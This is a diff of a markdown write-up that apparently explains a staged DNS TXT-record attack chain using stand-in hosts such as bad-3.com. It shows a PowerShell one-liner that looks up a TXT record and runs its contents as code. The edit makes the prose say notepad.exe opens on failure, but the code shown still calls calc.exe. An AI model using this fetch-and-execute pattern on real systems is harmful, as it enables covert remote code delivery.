@@ -149,7 +149,7 @@ Again, if the hash is returned, a request to ```bad-2.com``` is made, which cont
 ```powershell
 3f33323aef889606589b98fbb62c112e;$o=nslookup -q=txt bad-3.com;if($o|Select-String -Pattern "f6fd44d24b96ca51092b17bcb1048ac4"){$f=powershell (nslookup -q=txt bad-3.com)[6];$f}else{$s=powershell calc.exe;$s}
 ```
-Upon successful retrieval of the hash, ```bad-3.com``` is requested. Otherwise ```calc.exe``` will be opened.
+Upon successful retrieval of the hash, ```bad-3.com``` is requested. Otherwise ```notepad.exe``` will be opened.
 
 5. ```bad-3.com``` houses the TXT entry:
 ```powershell
